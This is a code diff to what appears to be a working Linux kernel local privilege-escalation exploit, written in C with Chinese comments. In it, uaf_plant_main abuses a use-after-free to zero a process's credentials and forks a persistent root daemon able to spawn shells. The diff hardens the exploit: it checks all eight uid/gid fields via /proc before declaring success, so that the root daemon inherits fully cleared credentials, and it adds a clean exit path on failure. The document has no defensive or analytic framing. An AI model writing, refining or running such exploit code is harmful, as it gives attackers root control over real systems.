@@ -1740,6 +1740,45 @@ static volatile int g_daemon_mode = 0;
  * second rootd would fight over the same socket path. */
 static int g_rootd_forked = 0;
 
+/* 2.0.39/2.0.41：/proc/<pid>/status 的 Uid:/Gid: 行给全部四个身份字段
+ * （real/effective/saved/fs），无需对方配合即可验证任何字段对。
+ * uids[0..3]=uid/euid/suid/fsuid，gids[0..3]=gid/egid/sgid/fsgid。 */
+static int read_pid_ids(int pid, unsigned uids[4], unsigned gids[4])
+{
+	char path[64], line[160];
+	FILE *file;
+	int have_u = 0, have_g = 0;
+	snprintf(path, sizeof(path), "/proc/%d/status", pid);
+	file = fopen(path, "r");
+	if (!file)
+		return -1;
+	while (fgets(line, sizeof(line), file)) {
+		if (!have_u && !strncmp(line, "Uid:", 4))
+			have_u = sscanf(line + 4, "%u %u %u %u",
+				&uids[0], &uids[1], &uids[2], &uids[3]) == 4;
+		else if (!have_g && !strncmp(line, "Gid:", 4))
+			have_g = sscanf(line + 4, "%u %u %u %u",
+				&gids[0], &gids[1], &gids[2], &gids[3]) == 4;
+	}
+	fclose(file);
+	return have_u && have_g ? 0 : -1;
+}
+
+/* 2.0.41（RC-7 修复）：rootd 必须在八字段全零的 cred 副本上出生——半清副本
+ * 会被 prepare_creds() 永久固化进 rootd（39.log 中 socket 属主 2000 即 fsuid
+ * 泄漏的实证）。procfs 读失败时 fail-open 放行，不让通道卡死。
+ * 在 cred 子进程内调用（读自己的 /proc/self）。 */
+static int self_ids_all_zero(void)
+{
+	unsigned u[4], g[4];
+	if (read_pid_ids(getpid(), u, g) != 0)
+		return 1;
+	for (int i = 0; i < 4; i++)
+		if (u[i] || g[i])
+			return 0;
+	return 1;
+}
+
 static void cred_child(void)
 {
 	sigset_t block;
@@ -1837,7 +1876,7 @@ static void cred_child(void)
 		 * The forked rootd gets a *copy* of the cred from prepare_creds(), i.e.
 		 * a real cred_jar object, so it can fork shells and exit normally.
 		 */
-		if (uid == 0 && euid == 0 && !g_rootd_forked) {
+		if (uid == 0 && euid == 0 && self_ids_all_zero() && !g_rootd_forked) {
 			pid_t rd = fork();
 			if (rd == 0) {
 				setpgid(0, 0);
@@ -1865,30 +1904,6 @@ static void log_proc_uid(pid_t pid)
 			dprintf(STDOUT_FILENO, "[cred] proc %s", line);
 	}
 	fclose(file);
-}
-
-/* 2.0.39：/proc/<pid>/status 的 Uid:/Gid: 行给全部四个身份字段
- * （real/effective/saved/fs），无需 child 配合即可验证任何字段对。
- * uids[0..3]=uid/euid/suid/fsuid，gids[0..3]=gid/egid/sgid/fsgid。 */
-static int read_child_ids(unsigned uids[4], unsigned gids[4])
-{
-	char path[64], line[160];
-	FILE *file;
-	int have_u = 0, have_g = 0;
-	snprintf(path, sizeof(path), "/proc/%d/status", (int)g_cred_child_pid);
-	file = fopen(path, "r");
-	if (!file)
-		return -1;
-	while (fgets(line, sizeof(line), file)) {
-		if (!have_u && !strncmp(line, "Uid:", 4))
-			have_u = sscanf(line + 4, "%u %u %u %u",
-				&uids[0], &uids[1], &uids[2], &uids[3]) == 4;
-		else if (!have_g && !strncmp(line, "Gid:", 4))
-			have_g = sscanf(line + 4, "%u %u %u %u",
-				&gids[0], &gids[1], &gids[2], &gids[3]) == 4;
-	}
-	fclose(file);
-	return have_u && have_g ? 0 : -1;
 }
 
 static int ask_child(unsigned *uid, unsigned *euid, unsigned *gid, unsigned *egid)
@@ -2354,7 +2369,7 @@ int uaf_plant_main(int argc, char **argv)
 			break;
 		}
 		/* /proc 全字段核对：已归零的字段对本轮跳过 */
-		have_ids = read_child_ids(uids, gids) == 0;
+		have_ids = read_pid_ids(g_cred_child_pid, uids, gids) == 0;
 		if (have_ids) {
 			field_done[0] |= uids[0] == 0 && gids[0] == 0;
 			field_done[1] |= uids[1] == 0 && gids[1] == 0;
@@ -2381,15 +2396,22 @@ int uaf_plant_main(int argc, char **argv)
 			dprintf(STDOUT_FILENO, "[cred] field clear incomplete, retry\n");
 			continue;
 		}
-		if (have_ids && uids[0] == 0 && uids[1] == 0) {
-			/* getuid/geteuid 全零 = 终局条件达成 */
-			rooted = 1;
-			continue;
-		}
+		/* 2.0.41（RC-7）：终局门禁从四值收紧为八字段全零——半清副本会被
+		 * prepare_creds() 固化进 rootd。/proc 读不到时 fail-open 回退旧
+		 * 四值门禁，不新增丢弃胜利的路径。 */
+		int all8 = !have_ids;
+		for (int i = 0; have_ids && i < 4; i++)
+			if (uids[i] || gids[i])
+				all8 = 0;
 		dprintf(STDOUT_FILENO, "[cred] fields cleared, verifying\n");
 		if (ask_child(&uid, &euid, &cgid, &cegid) == 0) {
-			if (uid == 0 && euid == 0) {
+			if (uid == 0 && euid == 0 && all8) {
 				rooted = 1;
+				continue;
+			}
+			if (uid == 0 && euid == 0) {
+				dprintf(STDOUT_FILENO,
+					"[cred] uid/euid clear, remaining id fields pending\n");
 				continue;
 			}
 			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
@@ -2398,6 +2420,19 @@ int uaf_plant_main(int argc, char **argv)
 		}
 	}
 	if (!rooted) {
+		/* 2.0.41：cred 子进程已消失（ESRCH）时快速退场——它是唯一持页者，
+		 * 其消失意味着 UAF 引用已全部释放，驻留纯属泄漏。 */
+		if (daemon_exit && kill(g_cred_child_pid, 0) != 0 && errno == ESRCH) {
+			dprintf(STDOUT_FILENO,
+				"[uaf] inject failed: cred child died before the handoff; exiting cleanly\n");
+			log_sync();
+			close(g_wake[1]);
+			close(g_report[0]);
+			close_stream();
+			free_aio_hold();
+			log_sync();
+			return 5;
+		}
 		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
 		for (;;)
 			pause();
